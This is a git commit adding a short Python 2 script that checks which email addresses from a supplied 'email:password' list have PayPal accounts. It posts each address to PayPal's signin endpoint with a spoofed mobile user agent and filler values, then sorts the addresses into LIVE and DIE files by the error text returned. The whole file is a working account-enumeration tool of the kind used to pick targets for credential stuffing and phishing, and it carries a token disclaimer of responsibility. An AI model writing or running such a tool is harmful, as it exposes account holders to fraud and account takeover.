c440c975d13b75c11aa3982e2c44de9f4aacbca0
jrdi14 <62805255+jrdi14@users.noreply.github.com>
2020-04-04 09:05:50 -0400

    Add files via upload

---
+++ cek.py
@@ -0,0 +1,33 @@
+print("PayPal Valid Email Checker")
+import requests
+live = open('PayPalLive.txt', 'w')
+die = open('PayPalDie.txt', 'w')
+Checked = "Checked by Thanos Valid Email Checker"
+print("_"*50)
+print"PayPal Valid Email Checker"
+print"I dont't Accept any Responsibility for any illegal usage!"
+print("_"*55)
+print" "
+list=raw_input("Input Mail List :")
+link = "https://www.paypal.com/id/signin"
+head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
+s = requests.session()
+g = s.get(link, headers=head)
+list = open(list, 'r')
+print("-"*55)
+while True:
+  email = list.readline().replace('\n','')
+  if not email:
+    break
+  bacot = email.strip().split(':')
+  xxx = {'customerName':'Androsex','email': bacot[0],'emailCheck': bacot[0],'password':'Kontol1337','passwordCheck':'Kontol1337'}
+  cek = s.post(link, headers=head, data=xxx).text
+  if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
+    print("\033[32;1mLIVE\033[0m | "+email+" | Checked by Thanos")
+    live.write(email + '\n')
+  else:
+    print("\033[31;1mDIE\033[0m | "+email+" | Checked by Thanos")
+    die.write(email + '\n')
+print("-"*50)
+print("\033[35;1mProccess Checking Done\033[0m")
+print("PayPal Valid Email was Saved in PayPalLive.txt")
